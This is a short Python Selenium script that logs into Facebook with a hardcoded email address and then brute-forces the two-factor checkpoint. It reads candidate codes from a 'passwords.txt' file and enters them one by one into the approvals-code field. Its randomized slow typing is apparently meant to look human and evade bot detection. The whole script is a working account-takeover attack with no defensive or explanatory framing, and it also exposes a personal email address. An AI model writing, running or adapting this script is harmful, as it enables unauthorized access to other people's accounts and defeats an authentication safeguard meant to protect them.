from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import random

EMAIL = 'digo.goes@hotmail.com'
PASSWORD = '*********'

def slow_type(element, text, delay_range=(0.25, 0.5)):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(*delay_range))

def try_code(driver, code):
    code_field = driver.find_element(By.ID, 'approvals_code')  # ajuste o ID conforme necessário
    slow_type(code_field, code)
    code_field.send_keys(Keys.RETURN)
    time.sleep(2)

driver = webdriver.Safari()
driver.get('https://www.facebook.com/login')

time.sleep(1)

email_field = driver.find_element(By.ID, 'email')
slow_type(email_field, EMAIL)

password_field = driver.find_element(By.NAME, 'pass')
slow_type(password_field, PASSWORD)
password_field.send_keys(Keys.RETURN)

time.sleep(1)
driver.get('https://www.facebook.com/checkpoint/?next')

time.sleep(1)

with open("passwords.txt", 'r') as file:
    codes = file.readlines()
    for code in codes:
        try_code(driver, code.strip())
